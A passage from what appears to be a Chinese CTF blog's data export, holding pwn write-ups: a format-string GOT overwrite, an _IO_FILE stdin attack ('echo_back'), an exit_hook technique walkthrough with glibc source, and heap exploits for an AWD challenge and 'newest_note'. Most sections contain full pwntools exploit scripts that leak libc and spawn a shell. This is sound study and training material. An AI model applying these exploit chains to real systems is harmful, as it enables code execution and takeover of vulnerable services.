setvbuf(stdin, 0LL, 1, 0LL);  puts(&quot;welcome to haerbin~&quot;);  if ( (unsigned int)CheckIn(&quot;welcome to haerbin~&quot;) == 1 )  &#123;    memset(buf, 0, 0x100uLL);    write(1, &quot;slogan: &quot;, 9uLL);    read(0, buf, 0x100uLL);    printf(buf);  &#125;  puts(&quot;bye~&quot;);  exit(0);&#125;\n\n_BOOL8 CheckIn()&#123;  unsigned int v0; // eax  unsigned __int8 v2; // [rsp+0h] [rbp-30h]  __int64 buf; // [rsp+10h] [rbp-20h] BYREF  __int16 v4; // [rsp+18h] [rbp-18h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v0 = time(0LL);  srand(v0);  v2 = rand() % 5 + 48;  printf(&quot;enter:&quot;);  buf = 0LL;  v4 = 0;  read(0, &amp;buf, 0xAuLL);  return (_BYTE)buf == v2;&#125;\n\n流程分析可以看到程序是进入CheckIn函数，跟随机数比较，但是这里rand()%5的大小为0~4，所以直接爆破就好。然后爆破成功之后会进入到格式化字符串漏洞，但是程序会直接exit结束。\n利用分析通过爆破进入格式化字符串漏洞，修改exit的got表到0x400982位置(可以重复利用格式化字符串)，泄漏出libc的基地址，修改printf函数的got表地址为system地址。\n重点是需要重复利用格式化字符串漏洞，所以修改了exit的got表后面直接泄漏和修改就好了。\n需要注意的是https://cv196082.gitee.io/2021/09/17/study-pwn1/ 在我的这篇文章里面说了got表的地址是怎么来的，因为exit是最后才执行所以exit的got表存的不是他的真是地址\n\n存放的是这个，所以我们直接修改低两位就可以了。\n在就是修改printf的地址为system地址的时候只需要覆盖后面三个字节也可以了。\nexpfrom pwn import *from LibcSearcher import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]printf_addr = 0x400982while 1:    elf = ELF(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    r = process(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    # r = remote(&#x27;111.200.241.244&#x27;, 54807)    try:        r.recvuntil(b&#x27;enter:&#x27;)        r.sendline(b&#x27;2&#x27;)        r.recvuntil(b&#x27;slogan:&#x27;)        break    except:        continue# gdb.attach(r)# offset=8context.log_level = &#x27;debug&#x27;exit_got = elf.got[&#x27;exit&#x27;]printf_got = elf.got[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]# 修改exit的got表地址payload = b&#x27;%&#x27;+bytes(str(0x982), encoding=&#x27;utf8&#x27;) + b&#x27;c%10$hn&#x27;payload = payload.ljust(0x10, b&#x27;a&#x27;)payload += p64(exit_got)# gdb.attach(r)r.sendline(payload)# 泄漏exit的真实地址r.recvuntil(b&#x27;slogan: &#x27;)payload = b&#x27;%10$s&#x27;.ljust(8, b&#x27;a&#x27;)+p64(read_got)# gdb.attach(r)r.sendline(payload)read_addr = u64(r.recvuntil(b&#x27;aaa&#x27;, drop=True)[1:].ljust(8, b&#x27;\\x00&#x27;))info(hex(read_addr))libc = LibcSearcher(&#x27;read&#x27;, read_addr)libc_base = read_addr-libc.dump(&#x27;read&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)# 修改printf的地址r.recvuntil(b&#x27;slogan: &#x27;)system_low = system_addr &amp; 0xffpayload = b&#x27;%&#x27;+bytes(str(system_low), encoding=&#x27;utf8&#x27;)+b&#x27;c%14$hhn&#x27;system_high = ((system_addr &amp; 0xffffff) &gt;&gt; 8) - system_lowpayload += b&#x27;%&#x27;+bytes(str(system_high), encoding=&#x27;utf8&#x27;)+b&#x27;c%15$hn&#x27;payload = payload.ljust(0x20, b&#x27;a&#x27;)+p64(printf_got)+p64(printf_got+1)r.sendline(payload)# getshellr.recvuntil(b&#x27;slogan: &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"echo_back","url":"/2021/12/06/echo-back/","content":"保护检查\n保护全开\n流程分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 result; // rax  int v4; // [rsp+8h] [rbp-18h]  char s[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  sub_A10(a1, a2, a3);  alarm(0x3Cu);  sub_A53();  v4 = 0;  memset(s, 0, sizeof(s));  while ( 1 )  &#123;    while ( 1 )    &#123;      result = menu();      if ( result != 2 )        break;      printf_vuln(s);    &#125;    if ( result == 3 )      break;    if ( result == 1 &amp;&amp; !v4 )    &#123;      set_name(s);      v4 = 1;    &#125;  &#125;  return result;&#125;\n\nssize_t __fastcall set_name(void *a1)&#123;  printf(&quot;name:&quot;);  return read(0, a1, 7uLL);&#125;\n\nunsigned __int64 __fastcall printf_vuln(const char *a1)&#123;  size_t nbytes; // [rsp+1Ch] [rbp-14h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  memset(&amp;nbytes + 4, 0, sizeof(size_t));  printf(&quot;length:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  getchar();  if ( (nbytes &amp; 0x80000000) != 0LL || nbytes &gt; 6 )    LODWORD(nbytes) = 7;  read(0, &amp;nbytes + 4, nbytes);  if ( *a1 )    printf(&quot;%s say:&quot;, a1);  else    printf(&quot;anonymous say:&quot;);  printf(&amp;nbytes + 4);  return __readfsqword(0x28u) ^ v3;&#125;\n\n整体流程就是你先设置名字然后说一句话\n漏洞分析漏洞点在printf_vuln函数里面，存在很明显的格式化字符串的漏洞\n\n在里面存在几处可以利用的信息(我这是manjaro所以__libc_start_main的地址有区别，但是不影响，后续还是要用ubuntu调试)，目前就是我们可以泄漏libc地址，可以泄漏程序地址。\n但是问题是我们输入的内容只能是七个字符，所以需要攻击scanf。\n_IO_FIELtypedef struct _IO_FILE FILE;   /* Standard streams.  */  extern struct _IO_FILE *stdin;      /* Standard input stream.  */  extern struct _IO_FILE *stdout;     /* Standard output stream.  */  extern struct _IO_FILE *stderr;     /* Standard error output stream.  */  #ifdef __STDC__  /* C89/C99 say they&#x27;re macros.  Make them happy.  */  #define stdin stdin  #define stdout stdout  #define stderr stderr  #endif \n\n_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;  _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;  _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; \n\n可以看出存在三个文件指针\n文件读取过程:_IO_new_file_underflow这个函数调用_IO_SYSREAD这个函数来实现的\nint _IO_new_file_underflow (_IO_FILE *fp)&#123;  _IO_ssize_t count;  ...  if (fp-&gt;_flags &amp; _IO_NO_READS)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  ## 如果输入缓冲区里存在数据，则直接返回  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    return *(unsigned char *) fp-&gt;_IO_read_ptr;  ...  if (fp-&gt;_IO_buf_base == NULL)    &#123;      ...      _IO_doallocbuf (fp);    &#125;  ...  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end    = fp-&gt;_IO_buf_base;  ##调用_IO_SYSREAD函数最终执行系统调用读取数据  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  ...  ## 设置结构体指针  fp-&gt;_IO_read_end += count;  ...  return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n\n\n再就是_IO_FILE这个结构。结合上面的函数可以看出来，_IO_SYSREAD函数是将数据写到_IO_buf_base这个位置，大小是_IO_buf_end-_IO_buf_end。\n\n可以看到这个_IO_2_1_stdin_的地址为0x7f680bbe48e0\n虽然我们格式化字符串想要直接修改到我们想要的地方是不得行的，但是我们可以将_IO_buf_base的内容的最后一个字节删去，这样地址就变成了0x7f680bbe4900计算一下发现到了_IO_write_base的地址，我就可以进一步修改这个结构内部的数据了。\n我们该怎么去删除_IO_buf_base最后一个字节呢？题目还给了一个setname函数，这个函数我们写入的参数也是存在在栈上的，所以一样可以使用格式化字符串，但是只允许有七个字节，但是一般地址都存在有\\x00位，又因为是小端序，所以直接写入就好。\nexpfrom pwn import *# from LibcSearcher import *elf = ELF(&#x27;./echo_back&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./echo_back&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 63836)# context.log_level = &#x27;debug&#x27;_IO_2_1_stdin_ = libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]def printf_vuln(content):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;8&#x27;)    r.send(content)def setName(name):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.send(name)def exit():    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)printf_vuln(b&#x27;%19$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)libc_start_main = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)-0xf0print(libc_start_main)libc_base = libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))_IO_2_1_stdin_addr = libc_base+_IO_2_1_stdin__IO_buf_addr = _IO_2_1_stdin_addr+0x8*7print(&quot;_IO_buf_addr:&quot;, hex(_IO_buf_addr))print(&quot;_IO_2_1_stdin_addr:&quot;, hex(_IO_2_1_stdin_addr))printf_vuln(b&#x27;%13$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_ret_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)elf_base = main_ret_addr-0xd08print(elf_base)pop_rdi_addr = 0x0000000000000d93+elf_baseprintf_vuln(b&#x27;%12$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_rbp_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)print(main_rbp_addr)setName(p64(_IO_buf_addr))printf_vuln(b&#x27;%16$hhn&#x27;)# gdb.attach(r)payload = p64(_IO_2_1_stdin_addr+0x83)*3 + \\    p64(main_rbp_addr+8)+p64(main_rbp_addr+8+8*3)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)for i in range(0, len(payload)-1):    print(i)    r.recvuntil(b&#x27;choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;&#x27;)    # gdb.attach(r)payload = p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)exit()r.interactive()\n\nexp中的循环是因为这条源代码\nif (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  return *(unsigned char *) fp-&gt;_IO_read_ptr;\n\n我没在修改结构体就会执行\nfp-&gt;_IO_read_end += count;\n\n所以需要绕过这条if语句\n在getchar内部有这样一条语句，所以循环绕过就行\nfp-&gt;_IO_read_end++\n\n\n\n\n\n参考博客:\nhttps://blog.csdn.net/weixin_44145820/article/details/104629998\nhttps://blog.csdn.net/seaaseesa/article/details/103114909\n","categories":["pwn-xctf"],"tags":["_IO_FILE"]},{"title":"exit_hook","url":"/2022/06/18/exit-hook/","content":"众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。\nexit_hook首先呢，程序正常退出以及使用exit函数都会调用exit所以不仅限于存在exit的题目适合\n源码分析void    exit (int status)&#123;    __run_exit_handlers (status, &amp;__exit_funcs, true, true);&#125;libc_hidden_def (exit)\n\nexit函数就只是单纯的调用了另一个函数，重点还是在另一个函数上面\nvoid    attribute_hidden    __run_exit_handlers (int status, struct exit_function_list **listp,                         bool run_list_atexit, bool run_dtors)&#123;    /* First, call the TLS destructors.  */    #ifndef SHARED    if (&amp;__call_tls_dtors != NULL)        #endif        if (run_dtors)            __call_tls_dtors ();    /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call     everyone on the list and use the status value in the last     exit (). */    while (true)    &#123;        struct exit_function_list *cur;        __libc_lock_lock (__exit_funcs_lock);        restart:        cur = *listp;        if (cur == NULL)        &#123;            /* Exit processing complete.  We will not allow any more\t     atexit/on_exit registrations.  */            __exit_funcs_done = true;            __libc_lock_unlock (__exit_funcs_lock);            break;        &#125;        while (cur-&gt;idx &gt; 0)        &#123;            struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];            const uint64_t new_exitfn_called = __new_exitfn_called;            /* Unlock the list while we call a foreign function.  */            __libc_lock_unlock (__exit_funcs_lock);            switch (f-&gt;flavor)            &#123;                    void (*atfct) (void);                    void (*onfct) (int status, void *arg);                    void (*cxafct) (void *arg, int status);                case ef_free:                case ef_us:                    break;                case ef_on:                    onfct = f-&gt;func.on.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (onfct);                    #endif                    onfct (status, f-&gt;func.on.arg);                    break;                case ef_at:                    atfct = f-&gt;func.at;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (atfct);                    #endif                    atfct ();                    break;                case ef_cxa:                    /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\t\t we must mark this function as ef_free.  */                    f-&gt;flavor = ef_free;                    cxafct = f-&gt;func.cxa.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (cxafct);                    #endif                    cxafct (f-&gt;func.cxa.arg, status);                    break;            &#125;            /* Re-lock again before looking at global state.  */            __libc_lock_lock (__exit_funcs_lock);            if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))                /* The last exit function, or another thread, has registered\t       more exit functions.  Start the loop over.  */                goto restart;        &#125;        *listp = cur-&gt;next;        if (*listp != NULL)            /* Don&#x27;t free the last element in the chain, this is the statically\t   allocate element.  */            free (cur);        __libc_lock_unlock (__exit_funcs_lock);    &#125;    if (run_list_atexit)        RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n这里先将源码放在这里，因为但看源码看不出什么\n\n但是通过调试可以看到这里是调用了_dl_fini函数，而这个函数在house of banana中提到过并且适用libc的版本还挺高在glibc2.34都是可以使用的。\nvoid    _dl_fini (void)&#123;    /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */    /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */    #ifdef SHARED    int do_audit = 0;    again:    #endif    for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;        /* Protect against concurrent loads and unloads.  */        __rtld_lock_lock_recursive (GL(dl_load_lock));        unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;        /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */        if (nloaded == 0            #ifdef SHARED            || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit            #endif           )            __rtld_lock_unlock_recursive (GL(dl_load_lock));        else        &#123;            /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */            struct link_map *maps[nloaded];            unsigned int i;            struct link_map *l;            assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)                /* Do not handle ld.so in secondary namespaces.  */                if (l == l-&gt;l_real)                &#123;                    assert (i &lt; nloaded);                    maps[i] = l;                    l-&gt;l_idx = i;                    ++i;                    /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */                    ++l-&gt;l_direct_opencount;                &#125;            assert (ns != LM_ID_BASE || i == nloaded);            assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);            unsigned int nmaps = i;            /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */            _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),                           NULL, true);            /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */            __rtld_lock_unlock_recursive (GL(dl_load_lock));            /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */            for (i = 0; i &lt; nmaps; ++i)            &#123;                struct link_map *l = maps[i];                if (l-&gt;l_init_called)                &#123;                    /* Make sure nothing happens if we are called twice.  */                    l-&gt;l_init_called = 0;                    /* Is there a destructor function?  */                    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL                        || l-&gt;l_info[DT_FINI] != NULL)                    &#123;                        /* When debugging print a message first.  */                        if (__builtin_expect (GLRO(dl_debug_mask)                                              &amp; DL_DEBUG_IMPCALLS, 0))                            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                                              DSO_FILENAME (l-&gt;l_name),                                              ns);                        /* First see whether an array is given.  */                        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)                        &#123;                            ElfW(Addr) *array =                                (ElfW(Addr) *) (l-&gt;l_addr                                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);                            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                                              / sizeof (ElfW(Addr)));                            while (i-- &gt; 0)                                ((fini_t) array[i]) ();                        &#125;                        /* Next try the old-style destructor.  */                        if (l-&gt;l_info[DT_FINI] != NULL)                            DL_CALL_DT_FINI                            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);                    &#125;                    #ifdef SHARED                    /* Auditing checkpoint: another object closed.  */                    if (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; 0, 0))                    &#123;                        struct audit_ifaces *afct = GLRO(dl_audit);                        for (unsigned int cnt = 0; cnt &lt; GLRO(dl_naudit); ++cnt)                        &#123;                            if (afct-&gt;objclose != NULL)                            &#123;                                struct auditstate *state                                    = link_map_audit_state (l, cnt);                                /* Return value is ignored.  */                                (void) afct-&gt;objclose (&amp;state-&gt;cookie);                            &#125;                            afct = afct-&gt;next;                        &#125;                    &#125;                    #endif                &#125;                /* Correct the previous increment.  */                --l-&gt;l_direct_opencount;            &#125;        &#125;    &#125;    #ifdef SHARED    if (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; 0)    &#123;        do_audit = 1;        goto again;    &#125;    if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))        _dl_debug_printf (&quot;\\nruntime linker statistics:\\n&quot;                          &quot;           final number of relocations: %lu\\n&quot;                          &quot;final number of relocations from cache: %lu\\n&quot;,                          GL(dl_num_relocations),                          GL(dl_num_cache_relocations));    #endif&#125;\n\n上面就是_dl_fini函数，这次重点关注的是这一段代码\n#ifdef SHAREDint do_audit = 0;again:#endiffor (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)&#123;    /* Protect against concurrent loads and unloads.  */    __rtld_lock_lock_recursive (GL(dl_load_lock));    unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;    /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */    if (nloaded == 0        #ifdef SHARED        || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit        #endif       )        __rtld_lock_unlock_recursive (GL(dl_load_lock));    ... ...&#125;\n\n下面给出两种函数的定义\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#  define GL(name) _rtld_global._##name\n\n可以看出来这里是将_rtld_global当中的属性当作函数来进行调用的\n\n然而这俩属性也就是俩指针，所以我们可以修改这个指针到system，接着就是构造参数了。根据上面的调用关系可以看到最后的参数其实是\n\n以上其实就是exit_hook的全部了，很简单。\n新的发现&#123;    ... ...        if (run_list_atexit)            RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n在上面的__run_exit_handlers 函数当中存在以上代码\n# define RUN_HOOK(NAME, ARGS)\t\t\t\t\t\t      \\do &#123;\t\t\t\t\t\t\t\t\t      \\  void *const *ptr;\t\t\t\t\t\t      \\  for (ptr = (void *const *) symbol_set_first_element (NAME);\t\t      \\       ! symbol_set_end_p (NAME, ptr); ++ptr)\t\t\t\t      \\    (*(__##NAME##_hook_function_t *) *ptr) ARGS;\t\t\t      \\&#125; while (0)\n\n跟进发现是可以循环执行内容的一个函数，所以这里如果可以修改掉__libc_atexit就可以getshell。\n然后实际的做题过程中会发现并没有__libc_atexit这个符号，因为这不是一个全局变量，所以是找不到的，但是通过汇编分析\n\n可以发现是这条语句在调用hook\n\n在最后的实际调用也可以看到确实是这样的，这里的rbx也就是上面的__libc_atexit指针。\n总结以上利用方式在最后总结一下以上两种利用方式，第一种利用方式的攻击层面其实是发生在ld层面的，所以也就存在了一些奇奇怪怪的因素(至少当初写house of banana总是会出现)但是这一种利用方式是可以我们控制其参数的。第二种利用方式就发生在libc层面了，所以我们修改起来也就更加的得心应手一点，不过坏处就是我们没法控制其参数。\n一次awd训练的pwn题目的漏洞很明显，在delete函数存在UAF，并且在edit函数存在堆溢出，不过恶心的是没有show函数并且题目使用的输出函数都是write导致我们没法使用_IO_FILE来进行泄漏，虽然glibc的版本是2.27但是malloc_hook和free_hook初始值都是0没法进行partial write所以这里就需要使用到exit_hook了。\n这里因为漏洞点很简单就不一步一步分析了，就是实现unsored bin和tcache中存在同一使用的chunk，进行partial write达成以下情况\n\n然后利用同样的方法修改掉他的参数也就是_rtld_global._dl_load_lock.mutex 的值为/bin/sh\\x00即可\nexpfrom pwn import *elf = ELF(&quot;./pwn&quot;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, data=b&#x27;\\n&#x27;):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)def delete(idx):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, size, data):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)exit_hook = 0x62af60while 1:    r = process(&#x27;./pwn&#x27;)    try:        # r = process(&#x27;./pwn&#x27;)        create(0x100)        create(0x100)        for i in range(8):            edit(0, 16, flat(0, 0))            delete(0)        create(0x80, b&#x27;\\x60\\xaf\\x82&#x27;)        create(0x100)        create(0x100, b&#x27;\\x20\\xf4\\x24&#x27;)        create(0x110)        create(0x110)        for i in range(8):            edit(5, 16, flat(0, 0))            delete(5)        create(0x90, b&#x27;\\x68\\xa9\\x82&#x27;)        create(0x110)        create(0x110, b&#x27;/bin/sh\\x00&#x27;)        r.recvuntil(b&#x27;Your choice :&#x27;)        # gdb.attach(r)        r.sendline(b&#x27;4&#x27;)        r.interactive()    except:        r.close()\n\n国赛newest_note这道题目其实存在一个非常明显，但是我这个蠢比没有发现的漏洞\ndword_4198 = input_int();chunk_arr = malloc(8 * dword_4198);\n\n也就是在开始的时候可以创建任意大小的chunk，所以可以直接泄露地址，不过即便是没注意到这个漏洞也是可以做题的，不过因为没有接触过exit_hook所以我当时的思路是劫持栈进行ROP，后面发现实现不了。\n在不用mmap生成chunk泄露的情况下在glibc-2.27_ubuntu1.2_amd64之后tcache就存在double free的检测了，结合题目这里是没法直接在tcache当中进行double free的，所以我们只能将double free发生在fastbin当中\n解题思路使用这种方法其实是比较麻烦的，首先将tcache占满，那么下一次释放的chunk会进入fastbin，然后create一个chunk，拿出tcache中的一个chunk，接着再释放一次fastbin当中的chunk，就达到了在tcacheh和fastbin当中存在同一个chunk的情况了，接着伪造fastbin，利用fastbin_reverse_into_tcache将伪造的链放入tcache即可进一步利用了。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(b&#x27;45&#x27;)for i in range(19):    create(i, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)for i in range(8):    delete(i)create(8, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;)) &lt;&lt; 12print(&#x27;heap_base=&gt;&#x27;, hex(heap_base))print(hex((heap_base + 0x610) &gt;&gt; 12))key = heap_base &gt;&gt; 12create(18, p64(key ^ (heap_base + 0x560)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x480)))create(19, b&#x27;\\n&#x27;)create(19, b&#x27;\\n&#x27;)create(19, p64(key ^ (heap_base + 0x460)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x420)))create(19, b&#x27;a&#x27; * 0x20 + p64(key))create(20, b&#x27;\\n&#x27;)create(21, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x441))delete(1)show(1)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))&#x27;&#x27;&#x27;0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)constraints:  [r15] == NULL || r15 == NULL  [r12] == NULL || r12 == NULL0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)constraints:  [r15] == NULL || r15 == NULL  [rdx] == NULL || rdx == NULL0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)constraints:  [rsi] == NULL || rsi == NULL  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(30, b&#x27;a&#x27; * 0x20 + p64(libc_atexit ^ key))create(31, b&#x27;\\n&#x27;)create(32, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n在mmap生成chunk的情况下解题思路在这个情况下其实就更加简单了，因为这里直接泄露了libc地址，所以我们不需要想上面那样构造fake tcache，我们只需要拿到double free即可，这里因为可以直接少用一次free所以我们可以直接在fastbin当中进行double free。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = 